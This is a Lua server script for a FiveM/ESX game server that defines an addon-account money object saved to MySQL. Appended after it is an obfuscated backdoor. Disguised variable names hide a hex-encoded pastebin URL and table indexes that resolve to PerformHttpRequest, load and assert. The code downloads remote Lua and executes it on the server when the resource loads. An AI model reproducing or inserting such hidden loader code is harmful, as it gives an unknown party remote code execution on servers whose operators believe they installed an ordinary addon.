function CreateAddonAccount(name, owner, money)
	local self = {}

	self.name  = name
	self.owner = owner
	self.money = money

	function self.addMoney(m)
		self.money = self.money + m
		self.save()
		TriggerEvent('esx_addonaccount:addMoney', self.name, m)
	end

	function self.removeMoney(m)
		self.money = self.money - m
		self.save()
		TriggerEvent('esx_addonaccount:removeMoney', self.name, m)
	end

	function self.setMoney(m)
		self.money = m
		self.save()
		TriggerEvent('esx_addonaccount:setMoney', self.name, m)
	end

	function self.save()
		if self.owner == nil then
			MySQL.update('UPDATE addon_account_data SET money = ? WHERE account_name = ?', {self.money, self.name})
		else
			MySQL.update('UPDATE addon_account_data SET money = ? WHERE account_name = ? AND owner = ?', {self.money, self.name, self.owner})
		end
		TriggerClientEvent('esx_addonaccount:setMoney', -1, self.name, self.money)
	end

	return self
end

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)
